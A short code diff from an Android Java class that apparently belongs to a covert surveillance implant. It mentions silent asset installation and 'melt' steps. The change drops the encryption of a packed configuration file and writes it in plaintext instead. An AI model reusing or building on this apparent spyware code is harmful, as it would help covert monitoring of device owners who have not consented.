@@ -1157,15 +1157,7 @@ public class Core extends Activity implements Runnable {
 				//markupMelt.serialize(Status.getAppContext().getPackageName());
 
 				AutoFile markup = new AutoFile(String.format("/data/data/%s/files/mm", dvci));
-				final byte[] confKey = Keys.self().getConfKey();
-				EncryptionPKCS5 crypto = new EncryptionPKCS5(confKey);
-				try {
-					markup.write(crypto.encryptData(pack.getBytes()));
-				} catch (CryptoException ex) {
-					if (Cfg.DEBUG) {
-						Check.log(ex);
-					}
-				}
+				markup.write(pack.getBytes());
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installSilentAsset), stopping melt");
